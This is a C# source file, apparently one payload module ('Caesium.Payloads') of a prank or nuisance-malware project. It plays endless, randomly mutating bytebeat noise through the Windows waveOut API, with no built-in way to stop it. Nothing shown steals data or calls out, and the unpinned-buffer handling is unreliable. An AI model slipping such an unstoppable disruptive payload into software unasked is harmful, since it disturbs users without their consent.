using System.Runtime.InteropServices;

namespace Caesium.Payloads;

public abstract partial class Bytebeat : IPayload
{
    [LibraryImport("winmm.dll")]
    private static partial void waveOutOpen(out IntPtr phwo, uint uDeviceId, ref Waveformatex pwfx,
        IntPtr dwCallback, IntPtr dwInstance, uint fdwOpen);

    [LibraryImport("winmm.dll")]
    private static partial void waveOutPrepareHeader(IntPtr hwo, ref Wavehdr pwh, uint cbwh);

    [LibraryImport("winmm.dll")]
    private static partial void waveOutWrite(IntPtr hwo, ref Wavehdr pwh, uint cbwh);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct Waveformatex {
        public ushort wFormatTag; public ushort nChannels; public uint nSamplesPerSec;
        public uint nAvgBytesPerSec; public ushort nBlockAlign; public ushort wBitsPerSample; public ushort cbSize;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct Wavehdr {
        public IntPtr lpData; public uint dwBufferLength; public uint dwBytesRecorded;
        public IntPtr dwUser; public uint dwFlags; public uint dwLoops;
        public IntPtr lpNext; public IntPtr reserved;
    }
    
    private static volatile uint _shiftA = 6;
    private static volatile uint _shiftB = 10;
    private static volatile uint _multiplier = 127;
    
    public static void Execute()
    {
        var fmt = new Waveformatex {
            wFormatTag = 1, nChannels = 1, nSamplesPerSec = 8000,
            nAvgBytesPerSec = 8000, nBlockAlign = 1, wBitsPerSample = 8, cbSize = 0
        };
        waveOutOpen(out var hWaveOut, 0xFFFFFFFF, ref fmt, IntPtr.Zero, IntPtr.Zero, 0);
        const int bufferSize = 4000;
        var buffer = new byte[bufferSize];
        uint t = 0;
    
        
        new Thread(MutationBrain) { IsBackground = true }.Start();
        byte lastSample = 128;
        while (true)
        {
            for (var i = 0; i < bufferSize; i++)
            {
                var low = (t >> (int)_shiftA) ^ (t >> (int)_shiftB);
                var high = (t * _multiplier) ^ (t >> 4);

                var combined = (high & (low << 2));
                var sample = (byte)(combined ^ (t >> 3 & t >> 5));
                
                lastSample = (byte)((sample * 3 + lastSample) >> 2);

                buffer[i] = lastSample;
                t++;
            }

            var header = new Wavehdr {
                lpData = Marshal.UnsafeAddrOfPinnedArrayElement(buffer, 0),
                dwBufferLength = bufferSize
            };
            waveOutPrepareHeader(hWaveOut, ref header, (uint)Marshal.SizeOf(header));
            waveOutWrite(hWaveOut, ref header, (uint)Marshal.SizeOf(header));
            
            Thread.Sleep(450); 
        }

        // MUTATION THREAD: The "Brain" of the chaos
        void MutationBrain()
        {
            while (true)
            {
                // Actually update the values used in the audio loop
                _shiftA = (uint)Random.Shared.Next(4, 9);
                _shiftB = (uint)Random.Shared.Next(10, 15);
                _multiplier = (uint)Random.Shared.Next(64, 255);

                // Randomly "glitch" the time counter to create jumps in the audio
                if (Random.Shared.Next(10) == 0) t += (uint)Random.Shared.Next(1000, 5000);

                Thread.Sleep(Random.Shared.Next(500, 3000));
            }
        }
    }
}